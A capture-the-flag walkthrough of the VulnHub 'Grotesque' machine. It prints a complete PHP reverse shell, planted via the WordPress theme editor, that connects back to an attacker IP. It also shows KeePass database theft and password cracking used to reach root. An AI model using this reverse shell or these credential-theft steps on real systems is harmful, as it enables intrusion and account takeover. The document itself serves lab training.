# Grotesque: 1.0.1

- **Machine:** Grotesque: 1.0.1
- **Download:** https://www.vulnhub.com/entry/grotesque-101,658/

![](866-1.png)

---

## Setup

- Import the `.ova` file into VirtualBox.
- Click **Finish**.
- Start the virtual machine.

---

# Network Scanning

## Find the Target IP Address

```bash
nmap -sn 192.168.2.0/24
```

![](866-2.png)

---

## Full Port Scan

Run a comprehensive Nmap scan to identify open ports, services, OS information, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.139
```

![](866-3.png)

---

## Optional Port Scan

```bash
nmap -v -p- 192.168.2.139
```

```bash
nmap -sC -sV -A 192.168.2.139
```

---

## HTTP Enumeration

Perform an aggressive scan and enumerate common web directories using the `http-enum` NSE script.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.139
```

![](866-4.png)

---

# Web Enumeration

Visit the web service running on port **66**.

- http://192.168.2.139:66/

---

## Inspect the Source Code

View the page source.

![](866-5.png)

A Brainfuck-encoded string is discovered.

Decode it using:

- https://www.dcode.fr/brainfuck-language

![](866-6.png)

---

## Discover Additional Files

Visit:

- http://192.168.2.139:66/sshpasswd.png

![](866-7.png)

The website also exposes a ZIP archive containing the project source.

![](866-8.png)

![](866-9.png)

---

## Download and Analyze the Project

Extract the archive.

```bash
unzip vvmlist.zip
```

![](866-10.png)

Navigate into the extracted directory.

```bash
cd vvmlist.github.io
```

![](866-11.png)

Analyze the project files.

```bash
cat _vvmlist/* | sort | uniq
```

![](866-12.png)

The project reveals a hidden WordPress installation.

---

## Enumerate WordPress

Visit:

- http://192.168.2.139/lyricsblog/

Run Gobuster.

```bash
gobuster dir -u http://192.168.2.139/lyricsblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

![](866-13.png)

---

## WordPress Login

Open the admin panel.

- http://192.168.2.139/lyricsblog/wp-admin/

![](866-14.png)

Enumerate WordPress users.

```bash
wpscan --url http://192.168.2.139/lyricsblog --enumerate u
```

![](866-15.png)

Discovered username:

```text
erdalkomurcu
```

---

## Recover the Password

Inspect the WordPress page.

![](866-16.png)

View the hidden content.

![](866-17.png)

Save the content locally.

```bash
nano test.txt
```

![](866-18.png)

Generate its MD5 hash.

```bash
md5sum test.txt
```

![](866-19.png)

Login using the recovered credentials.

```text
Username : erdalkomurcu
Password : BC78C6AB38E114D6135409E44F7CDDA2
```

- http://192.168.2.139/lyricsblog/wp-login.php

![](866-20.png)

Successful login.

- http://192.168.2.139/lyricsblog/wp-admin/

![](866-21.png)

---

# Reverse Shell (Lab)

> **Lab note:** The following steps are intended only for an authorized practice machine such as this VulnHub VM.

Navigate to:

```text
Appearance → Theme File Editor → archive.php
```

![](866-22.png)

Replace the file contents with the PHP reverse shell.

```php
<?php

set_time_limit(0);
$VERSION = "1.0";
$ip = '192.168.2.219';   // CHANGE THIS
$port = 443;             // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();

    if ($pid == -1) {
        exit(1);
    }

    if ($pid) {
        exit(0);
    }

    if (posix_setsid() == -1) {
        exit(1);
    }

    $daemon = 1;
}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);

if (!$sock) {
    exit(1);
}

$descriptorspec = [
    0 => ["pipe", "r"],
    1 => ["pipe", "w"],
    2 => ["pipe", "w"]
];

$process = proc_open($shell, $descriptorspec, $pipes);

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

while (1) {

    if (feof($sock) || feof($pipes[1])) {
        break;
    }

    $read_a = [$sock, $pipes[1], $pipes[2]];
    stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
        fwrite($pipes[0], fread($sock, $chunk_size));
    }

    if (in_array($pipes[1], $read_a)) {
        fwrite($sock, fread($pipes[1], $chunk_size));
    }

    if (in_array($pipes[2], $read_a)) {
        fwrite($sock, fread($pipes[2], $chunk_size));
    }
}

fclose($sock);
proc_close($process);

?>
```

![](866-23.png)

Start a listener.

```bash
nc -nlvp 443
```

Trigger the payload by visiting:

```text
http://192.168.2.139/lyricsblog/wp-content/themes/twentytwentyone/archive.php
```

A reverse shell is established.

![](866-24.png)

---

# Privilege Escalation

Navigate to the WordPress directory.

```bash
cd /var/www/html/lyricsblog
```

List the files.

```bash
ls -lh
```

![](866-25.png)

Read the WordPress configuration.

```bash
cat wp-config.php
```

![](866-26.png)

Database credentials discovered:

```text
Username : raphael
Password : _double_trouble_
```

Switch to the user.

```bash
su raphael
```

![](866-27.png)

Spawn a fully interactive shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![](866-28.png)

---

## KeePass Database Discovery

List hidden files.

```bash
ls -lha
```

![](866-29.png)

Transfer the KeePass database.

Start a web server:

```bash
python3 -m http.server 8080
```

![](866-30.png)

Download the database.

```bash
wget http://192.168.2.139:8080/.chadroot.kdbx
```

![](866-31.png)

Extract the KeePass hash.

```bash
keepass2john .chadroot.kdbx > keepass.hash
```

![](866-32.png)

Crack it using John.

```bash
john keepass.hash --wordlist=/opt/rockyou.txt
```

![](866-33.png)

Open the KeePass database.

```bash
kpcli --kdb .chadroot.kdbx
```

![](866-34.png)

---

## Extract Stored Credentials

List available groups.

```bash
ls
```

Navigate to the secret group.

```bash
cd /secret
```

List stored entries.

```bash
ls
```

![](866-35.png)

Display every stored credential.

```bash
show 0
```

```bash
show 1
```

```bash
show 2
```

```bash
show 3
```

![](866-36.png)

![](866-37.png)

Recovered credentials:

| Username | Password |
|----------|----------|
| root | .:.yarak.:. |
| root | secretservice |
| root | .:.subjective.:. |
| root | rockyou.txt |

---

## Root Access

Switch to the root account.

```bash
su root
```

![](866-38.png)

Verify access.

```bash
ls -lh
```

Read the user flag.

```bash
cat user.txt
```

```text
F6ACB21652E095630BB1BEBD1E587FE7
```

![](866-39.png)

Navigate to the root directory.

```bash
cd /root
```

List files.

```bash
ls -lh
```

Read the root flag.

```bash
cat root.txt
```

```text
AF7DD472654CBBCF87D3D7F509CB9862
```

![](866-40.png)

---

# Key Learning

- Always inspect source code and hidden files during web enumeration.
- Downloadable source code often exposes hidden endpoints and credentials.
- WordPress enumeration can reveal usernames and login paths.
- Configuration files frequently contain reusable credentials.
- KeePass databases may store highly privileged credentials.
- Proper enumeration at every stage can lead from initial access to full system compromise.

---

# Summary

The assessment started by enumerating a web application running on a non-standard port. Source code and downloadable project files revealed a hidden WordPress installation. After recovering valid credentials, administrative access was obtained and a PHP reverse shell was deployed through the theme editor. Further enumeration exposed database credentials that allowed access to another local user. A KeePass database was then recovered, cracked, and used to obtain multiple root credentials, ultimately resulting in complete compromise of the target system.